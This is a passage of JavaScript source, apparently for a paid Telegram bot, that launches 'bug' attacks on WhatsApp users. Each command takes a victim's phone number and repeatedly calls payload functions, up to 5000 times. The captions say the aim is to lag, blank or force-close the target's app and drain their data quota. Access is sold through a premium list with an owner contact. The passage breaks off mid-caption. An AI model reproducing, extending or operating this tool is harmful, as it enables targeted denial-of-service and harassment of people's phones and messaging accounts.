
  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 1000; i++) {
      await Jtwdlyinvis(jid);
      await sleep(4500);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/1000 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD 
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}

`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/blankBrothers (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK CLICK 
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 10; i++) {
      await VampireBugIns(jid);
      await sleep(2000);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/10 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆??𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : BLANK CLICK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ForceClick (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE CLICK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 5; i++) {
      await StcX(jid);
      await sleep(2500);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/5 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE CLICK
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/ForceCloseNewXCombo (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallatecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE 1 PESAN COMBO
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 5; i++) {
      await senzyfc2(jid);
      await senzyfc1(jid);
      await senzyfc3(jid);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/30 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FORCE CLOSE 1 PESAN COMBO
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/bulldozer2GB (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY NYEDOT KOUTA
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 2000; i++) {
      await Jtwdlyinvis(jid);
      await sleep(5000);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/2000 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY NYEDOT KOUTA
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayX (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : MEDIUM DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 15; i++) {
      await Delayjam(jid);
      await sleep(5000);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/15 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : MEDIUM DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayXhard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 400; i++) {
      await JammerMutated(jid);
      await JammerZombieX(jid);
      await InvisHard(jid, false);
      await JammerMutated(jid);
      await InvisHard(jid, false);
      await JammerMutated(jid);
      await new Promise((resolve) => setTimeout(resolve, 1000));
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/400 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/bulldozer5GB (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD NYEDOT KOUTA
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 5000; i++) {
      await Jtwdlyinvis(jid);
      await sleep(5500);
      console.log(
        chalk.red(
          `[BROTHERS] BUG Processing ${count}/5000 Loop ke ${formattedNumber}`
        )
      );
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY HARD NYEDOT KOUTA
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


bot.onText(/\/iphoneXandro (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
BUY AKSES DULU SONO SAMA KING👑 LUV2HATE
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝐎𝐖𝐍𝐄𝐑",
              url: "https://t.me/sallstecu",
            },
          ],
        ],
      },
    });
  }


  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`
      );
    }

    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/3i9q09.jpg",
      {
        caption: `\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY IPHONE X ANDRO
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
`,
        parse_mode: "Markdown",
      }
    );

    let count = 0;

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
      await senzyv3(jid);
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await bot.editMessageCaption(
      `
\`\`\`
#𝗦𝗨𝗞𝗦𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 \`\`\`
◇ 𝐎𝐖𝐍𝐄𝐑 : @sallstecu
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username}
